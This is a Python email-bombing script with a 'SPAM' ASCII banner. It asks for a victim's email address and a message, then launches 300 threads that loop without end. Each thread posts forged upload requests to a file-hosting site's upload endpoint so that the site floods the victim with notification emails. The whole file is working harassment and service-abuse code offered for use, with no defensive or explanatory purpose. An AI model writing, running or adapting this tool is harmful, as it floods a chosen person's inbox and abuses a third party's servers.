
import threading,requests,random
                  

print('''
        ___           ___            ___         ___     
     /\  \         /\  \          /\  \       /\__\    
    /::\  \        \:\  \         \:\  \     /::|  |   
   /:/\ \  \        \:\  \    ___ /::\__\   /:|:|  |   
  \:\~\ \  \       /::\  \  /\  /:/\/__/  /:/|:|__|_ 
 /\ \:\ \ \__\     /:/\:\__\ \:\/:/  /    /:/ |::::\__\
 \:\ \:\ \/__/    /:/  \/__/  \::/  /     \/__/~~/:/  /
  \:\ \:\__\     /:/  /        \/__/            /:/  / 
   \:\/:/  /     \/__/                         /:/  /  
    \::/  /                                   /:/  /   
     \/__/                                    \/__/    
                                    

                                                                                      
''')
email = input(' - Enter the email: ')
msg = input(' - Enter the message: ')


def spam():
    while 1:
        try:
            word = msg+'                        '
            chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            for i in range(30):
                word += random.choice(chars)

            data = {
                'uploader_email': email,
                'accept_tos': 1,
                'original_filename': word,
                'file_path': '/mnt/filehosting/21/files/1/5/f/15ffb040ce6abd6e',
                'file_size': '13650',
                'file_type': 'text/plain'
            }
            r = requests.post('https://www.filehosting.org/file/upload', data=data).status_code
            if r == 200:
                print(f' Sent!')
            else:
                print(f' Bad!')
        except:
            print(' To much requests!')
            pass

for i in range(300):
    t = threading.Thread(target=spam)
    t.start()